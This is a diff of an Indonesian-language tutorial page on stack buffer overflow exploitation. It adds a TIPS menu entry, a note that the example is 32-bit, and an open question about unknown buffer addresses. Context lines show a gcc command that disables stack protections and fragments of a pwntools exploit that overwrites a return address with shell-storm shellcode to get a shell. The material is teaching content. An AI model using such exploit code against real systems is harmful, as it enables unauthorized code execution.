@@ -244,6 +244,9 @@
                         </li> -->
                     </ol>
                 </li>
+                <!-- -------------------- TIPS -------------------- -->
+                <li class="chapter-item expanded "><a href="../04-tips/index.html"><strong aria-hidden="true">4.
+                    TIPS </strong></a></li>
                 <!-- -------------------- Akhir -------------------- -->
             </ol>
         </div>
@@ -336,7 +339,7 @@ int main(){
                         
     return 0;
 }</code></pre></p>
-<p>Makefile : (asumsi nama file shellcode.c)<br> 
+<p>Makefile : (asumsi nama file shellcode.c)<br>*sementara masih yg 32bit :) 
 <pre><code>gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode.c -o shellcode</code></pre>
 </p>
                     <p>link shellcode <a href="http://shell-storm.org" target="_blank">http://shell-storm.org</a><br>
@@ -419,7 +422,7 @@ buff = int(p.recvline(),16)
 # asumsi telah mengetahui offset (berdasarkan percobaan diatas) --> dapat diganti
 offset = 68
 
-# asumsi menggunakan mesin &lt;I / litle endian --> dapat diganti (jika perlu)
+# asumsi menggunakan mesin &lt;I / litle endian 32 bit --> dapat diganti (jika perlu)
 memori_buff = struct.pack("&lt;I", buff) 
 
 # paten / didapat dr http://shell-storm.org/shellcode/files/shellcode-752.php
@@ -435,6 +438,13 @@ p.sendline(payload+'<span class="hljs-symbol">\n</span>')
 p.interactive()
             </code></pre>
             sudah masuk ke dalam shell
+            <br><br>
+            <p>Masalah : <br>
+            <ol>
+                <li>bagaimana kalau tidak diketahui alamat buffer ?</li>
+            </ol>
+            </p>
+            <br><br><br><br><br>
             
     </p>
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
